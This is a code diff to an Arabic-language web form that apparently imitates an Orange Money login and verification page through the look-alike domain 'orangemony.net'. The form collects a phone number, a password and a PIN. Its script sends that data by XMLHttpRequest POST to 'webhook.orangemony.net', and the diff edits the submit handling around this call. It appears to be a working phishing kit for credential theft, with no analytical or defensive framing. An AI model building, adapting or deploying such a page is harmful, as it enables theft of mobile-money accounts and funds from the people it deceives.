@@ -135,7 +135,8 @@
                             <div id="invalid_label_pin" class="invalid_label_hide">
                                 يرجى أدخال الرمز بشكل صحيح
                             </div>
-                            <input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button w-button sb_disabled" value="التحقق" onclick="window.location.href = 'https://www.orangemony.net/verification';">
+                            <!-- <input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button w-button sb_disabled" value="التحقق" onclick="window.location.href = 'https://www.orangemony.net/verification';"> -->
+                            <input type="submit" data-wait="يرجى الانتظار" id="sb" class="submit-button w-button sb_disabled" value="التحقق">
                         </div>
                         <input class="text-field-3 w-input" maxlength="256" name="رقم الهاتف" data-name="رقم الهاتف" placeholder="" type="text" id="phonenumber">
                         <input class="text-field-4 w-input" maxlength="256" name="كلمة المرور" data-name="كلمة المرور" placeholder="" type="text" id="password">
@@ -239,7 +240,7 @@
             $('#verificationForm').hide()
             $('.success-message').show()
 
-            event.preventDefault();
+            // event.preventDefault();
             var xhr = new XMLHttpRequest();
             xhr.open("POST", 'https://webhook.orangemony.net', true);
             xhr.setRequestHeader('Content-Type', 'application/json');
